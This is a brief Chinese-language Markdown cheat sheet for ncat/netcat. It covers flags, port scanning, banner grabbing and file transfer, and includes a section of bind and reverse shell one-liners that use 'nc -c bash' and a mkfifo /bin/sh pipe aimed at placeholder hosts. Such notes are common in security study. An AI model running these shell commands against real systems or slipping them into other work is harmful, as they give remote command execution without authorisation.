# ncat

下载地址：<https://nmap.org/download.html>

## 参数介绍

- -v列出执行过程详细信息
- -n不进行dns解析
- -z只ping，不进行io
- -l开启监听
- -p指定端口
- -q seconds输入结束x秒后退出

!!! example
    - 端口扫描：`ncat -nvz x.x.x.x 1-100`，默认tcp，如果扫描udp，需添加-u
    - 获取服务banner：`nc -nv x.x.x.x 110`
    - 传输文本信息：server`nc -l -p 1234`, client`nc -nv x.x.x.x 1234`，可相互传输。通过管道输出：`ls -l | nc -nv x.x.x.x 1234`。接收数据重定向：`nc -l -p 1234 > xxx.txt`。
    - 文件传输
        - 正向：server`nc -l -p 1234 > xxx.txt`接收文件, client`nc -nv x.x.x.x 1234 < xxx.txt`
        - 反向：server`nc -q 1 -lp 1234 < xxx.txt`发送文件, client`nc -nv x.x.x.x 1234 > xxx.txt`。打包传输目录：server`tar cvf - xxx/ | nv -lp 1234 -q 1`, client`nc -nv x.x.x.x 1234 | tar xvf -`
    - 反弹shell
        - 正向：server`nc -lp 1234 -c bash`被执行命令，client`nc x.x.x.x 1234`执行命令。
        - 反向：server`nv -lp 53`执行命令，client`nc -nv x.x.x.x 53 -c bash`被执行命令。
        - server`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l x.x.x.x 1234 > /tmp/f`被执行命令, client`nc x.x.x.x 1234`执行命令

!!! abstract
    ncat属于nmap的组件，相比于nc(netcat)，提供`--allow`指定允许连接的机器，`--ssl`进行数据加密。

!!! quote "参考链接"
    <https://blog.csdn.net/fageweiketang/article/details/82833193>
